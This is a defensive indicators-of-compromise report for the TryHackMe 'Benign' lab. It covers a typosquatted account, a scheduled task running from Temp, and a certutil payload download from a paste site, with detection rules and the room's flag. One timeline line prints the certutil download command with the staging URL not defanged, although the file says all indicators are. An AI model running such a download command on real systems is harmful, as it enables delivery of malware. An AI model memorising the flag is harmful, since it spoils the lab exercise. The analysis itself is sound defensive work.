# Indicators of Compromise — TryHackMe *Benign*

All network indicators are **defanged** (`hxxp://`, `[.]`) so this file is safe
to copy/paste into tickets and reports.

> Source of truth: **Windows Security Event ID 4688** (process creation) logs in
> the Splunk index `win_eventlogs`, March 2022.

---

## Account indicators

| Indicator | Type | Context | Confidence |
| --- | --- | --- | --- |
| `Amel1a` | Look-alike / masquerading account | Typosquat of the legitimate Marketing user `Amelia` (`1` instead of `i`). Only observed activity: `whoami.exe` (host discovery). | High — anomaly in the account list |
| `Chris.fort` | Legitimate HR account abused | Created a scheduled task running `update.exe` from a `\Temp\` path at startup. | Medium — the account is legitimate; the action is suspicious |
| `haroon` | Legitimate HR account abused | Executed `certutil.exe` to download the payload. | High — single, clear LOLBIN download event |

## Host / process indicators

| Indicator | Type | Context |
| --- | --- | --- |
| `certutil.exe -urlcache -f - <url> <file>` | Command line | LOLBIN download pattern using the Windows Certificate Utility (`T1105`) |
| `schtasks.exe` creating a task that runs `update.exe` from `\Temp\` | Command line / persistence | Scheduled task masquerading as an "Office update"; runs at startup (`T1053.005`) |
| `whoami.exe` executed by `Amel1a` | Command line / discovery | Post-compromise host/user enumeration (`T1033`) |
| `benign.exe` | Dropped file | Payload written to disk on the HR host via `certutil.exe` — name is intentional misdirection |

## Network indicators

| Indicator | Type | Context |
| --- | --- | --- |
| `hxxps[://]controlc[.]com/e4d11035` | URL | Payload staging page; also where the flag `THM{KJ&*H^B0}` is displayed |
| `controlc[.]com` | Domain | Third-party paste/file-sharing service abused for staging (`T1608.001`) |
| `hxxps[://]controlc[.]com/548ab556` | URL | Older room version of the same indicator — same behaviour, different paste ID |

## Timeline

| Timestamp (UTC, from event data) | Actor | Event |
| --- | --- | --- |
| March 2022 (time not established by available telemetry) | `Amel1a` | `whoami.exe` process creation — discovery |
| March 2022 (time not established by available telemetry) | `Chris.fort` | `schtasks.exe` creates a task executing `update.exe` from `\Temp\` at startup |
| `2022-03-04` | `haroon` | `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe` — payload retrieved from the staging host |

## What we could NOT determine from this dataset

Being explicit about gaps keeps the investigation honest:

* **Payload hash** (MD5/SHA-1/SHA-256) — 4688 contains no hashing data.
* **Network connection details** — no proxy, DNS or NetFlow telemetry available.
* **Exact account creation time for `Amel1a`** — needs 4720/4722 events.
* **Which process executed `benign.exe`, and with what effect** — the payload's
  execution is not visible in the available window/fields.
* **Whether `update.exe` from the scheduled task ever ran or what it was** —
  only the task-creation process event is present.

## Recommended blocking / hunting values

* Block or alert on `controlc[.]com` (and similar paste/upload hosts) for
  executable downloads where not business-justified.
* Alert on `certutil.exe` (and other LOLBAS downloaders) fetching objects over
  HTTP(S) with `-urlcache` / `-split` / `-f`.
* Alert on `schtasks.exe /create` with a task action pointing into `\Temp\`,
  `\AppData\`, `\ProgramData\`, `Users\Public\` or `\Downloads\`.
* Add `Amel1a` to the identity deny-list and audit for other typo-squat
  accounts (`Amelia` → `Amel1a` pattern).
